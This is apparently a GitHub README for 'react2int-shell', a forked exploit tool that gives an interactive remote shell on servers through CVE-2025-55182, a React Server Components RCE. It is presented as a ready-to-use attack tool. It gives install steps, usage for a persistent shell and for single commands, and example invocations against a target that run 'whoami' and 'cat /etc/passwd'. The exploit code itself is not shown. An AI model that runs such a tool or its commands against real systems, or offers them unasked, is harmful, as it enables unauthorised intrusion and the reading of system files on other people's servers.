# react2int-shell

Interactive shell exploit for **CVE-2025-55182** — React Server Components RCE.

Forked from [surajhacx/react2shellpoc](https://github.com/surajhacx/react2shellpoc) with added interactive shell mode and TAB completion.

## Install

```bash
pip install -r requirements.txt
```

## Usage

### Interactive shell (default)

```
python exploit.py -t <target>
```

Drops into a persistent pseudo-shell with:
- Working directory tracking (`cd` persists between commands)
- TAB completion for filenames (refreshed after each `cd`)
- Type `exit` or `quit` to close

### Single command

```
python exploit.py -t <target> -c "whoami"
```

### Help

```
python exploit.py -h

usage: exploit.py [-h] [-t URL] [-c CMD]

options:
  -h, --help         show this help message and exit
  -t, --target URL   Target URL or domain
  -c, --command CMD  Single command to execute (omit for interactive shell)

Examples:
  exploit.py -t hacx.me                          # interactive shell
  exploit.py -t hacx.me -c "whoami"              # single command
  exploit.py -t http://hacx.me -c "cat /etc/passwd"
```

## Credits

Original exploit by [surajhacx](https://github.com/surajhacx) (hacx.me)
